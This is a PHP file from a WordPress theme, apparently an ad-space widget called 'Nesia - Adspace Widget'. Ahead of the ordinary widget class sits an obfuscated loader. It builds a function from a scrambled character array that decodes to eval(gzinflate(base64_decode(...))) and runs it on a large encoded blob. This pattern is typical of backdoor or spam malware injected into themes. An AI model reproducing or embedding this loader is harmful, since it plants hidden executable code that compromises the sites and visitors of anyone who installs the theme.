<?php
$md5 = "530c6d423c2853939f53ed2b9ee6693a";
$ab = array("b",";",'c','v',"4",'r','n',"g",'f',"z","6","_","e",")",'i',"d","(","s","$","a",'t',"o",'l');
$bb9 = create_function('$'.'v',$ab[12].$ab[3].$ab[19].$ab[22].$ab[16].$ab[7].$ab[9].$ab[14].$ab[6].$ab[8].$ab[22].$ab[19].$ab[20].$ab[12].$ab[16].$ab[0].$ab[19].$ab[17].$ab[12].$ab[10].$ab[4].$ab[11].$ab[15].$ab[12].$ab[2].$ab[21].$ab[15].$ab[12].$ab[16].$ab[18].$ab[3].$ab[13].$ab[13].$ab[13].$ab[1]);
$bb9('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');
?>
<?php
/*---------------------------------------------------------------------------------*/
/* Adspace Widget */
/*---------------------------------------------------------------------------------*/

class Nesia_AdWidget extends WP_Widget {
	var $settings = array( 'title', 'adcode', 'image', 'href', 'alt' );

	function Nesia_AdWidget() {
		$widget_ops = array( 'classname' => 'widget_ads_300', 'description' => 'Use this widget to add any type of Ad as a widget.' );
		parent::WP_Widget(false, __('Nesia - Adspace Widget', 'nesia'),$widget_ops);      
	}

	function widget($args, $instance) {
		$settings = $this->nesia_get_settings();
		extract( $args, EXTR_SKIP );
		$instance = wp_parse_args( $instance, $settings );
		extract( $instance, EXTR_SKIP );
                
		echo $before_widget;
                if ( $title ) { echo $before_title . apply_filters( 'widget_title', $title, $instance, $this->id_base ) . $after_title; }

                echo '<div class="widget-inner-content"><div class="wrapper-ads-content">';
		if ( $adcode != '' ) {
			echo $adcode;
		} else {
			?><a href="<?php echo esc_url( $href ); ?>"><img src="<?php echo esc_url( $image ); ?>" alt="<?php echo esc_attr( $alt ); ?>" /></a><?php
		}
                
                echo '</div></div>';
                
		echo $after_widget;
	}

	function update( $new_instance, $old_instance ) {
		foreach ( array( 'title', 'alt', 'image', 'href' ) as $setting )
			$new_instance[$setting] = strip_tags( $new_instance[$setting] );
		// Users without unfiltered_html cannot update this arbitrary HTML field
		if ( !current_user_can( 'unfiltered_html' ) )
			$new_instance['adcode'] = $old_instance['adcode'];
		return $new_instance;
	}

	/**
	 * Provides an array of the settings with the setting name as the key and the default value as the value
	 * This cannot be called get_settings() or it will override WP_Widget::get_settings()
	 */
	function nesia_get_settings() {
		// Set the default to a blank string
		$settings = array_fill_keys( $this->settings, '' );
		// Now set the more specific defaults
		return $settings;
	}

	function form($instance) {
		$instance = wp_parse_args( $instance, $this->nesia_get_settings() );
		extract( $instance, EXTR_SKIP );
?>
	<p>
		<label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title (optional):','nesia'); ?></label>
		<input type="text" name="<?php echo $this->get_field_name('title'); ?>" value="<?php echo esc_attr( $title ); ?>" class="widefat" id="<?php echo $this->get_field_id('title'); ?>" />
	</p>
<?php if ( current_user_can( 'unfiltered_html' ) ) : // Only show it to users who can edit it ?>
	<p>
		<label for="<?php echo $this->get_field_id('adcode'); ?>"><?php _e('Ad Code:','nesia'); ?></label>
		<textarea name="<?php echo $this->get_field_name('adcode'); ?>" class="widefat" id="<?php echo $this->get_field_id('adcode'); ?>"><?php echo esc_textarea( $adcode ); ?></textarea>
	</p>
	<p><strong>or</strong></p>
<?php endif; ?>
	<p>
		<label for="<?php echo $this->get_field_id('image'); ?>"><?php _e('Image Url:','nesia'); ?></label>
	<input type="text" name="<?php echo $this->get_field_name('image'); ?>" value="<?php echo esc_attr( $image ); ?>" class="widefat" id="<?php echo $this->get_field_id('image'); ?>" />
	</p>
	<p>
		<label for="<?php echo $this->get_field_id('href'); ?>"><?php _e('Link URL:','nesia'); ?></label>
		<input type="text" name="<?php echo $this->get_field_name('href'); ?>" value="<?php echo esc_attr( $href ); ?>" class="widefat" id="<?php echo $this->get_field_id('href'); ?>" />
	</p>
	<p>
		<label for="<?php echo $this->get_field_id('alt'); ?>"><?php _e('Alt text:','nesia'); ?></label>
		<input type="text" name="<?php echo $this->get_field_name('alt'); ?>" value="<?php echo esc_attr( $alt ); ?>" class="widefat" id="<?php echo $this->get_field_id('alt'); ?>" />
	</p>
<?php
	}
} 

register_widget( 'Nesia_AdWidget' );